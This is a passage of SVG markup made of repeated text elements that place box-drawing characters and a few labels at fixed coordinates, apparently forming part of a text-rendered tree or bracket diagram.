<text text-anchor='middle' x='800' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='772' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='800' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='808' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='276' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='816' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='372' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='816' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='676' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='816' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='772' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='816' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='816' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='824' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='832' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='840' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='848' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='856' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='864' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='872' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='244' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='880' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='308' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='880' y='340' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='880' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='404' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='880' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='644' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='880' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='708' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='880' y='740' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='880' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='880' y='804' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='880' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='880' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='888' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='896' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='904' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='912' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='920' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='920' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='920' y='180' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='920' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='436' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='920' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='920' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='920' y='580' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='920' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='920' y='836' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='920' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='920' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='928' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='928' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='928' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='928' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='928' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='928' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='936' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='936' y='116' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='936' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='468' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='936' y='516' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='936' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='836' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='852' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='936' y='868' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='936' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='944' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='944' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='952' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='952' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='960' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='960' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='968' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='968' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='976' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='976' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='984' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='984' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='992' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='992' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1000' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1000' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1008' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1008' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1016' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1016' y='932' fill='currentColor' style='font-size:1em'>─</text>
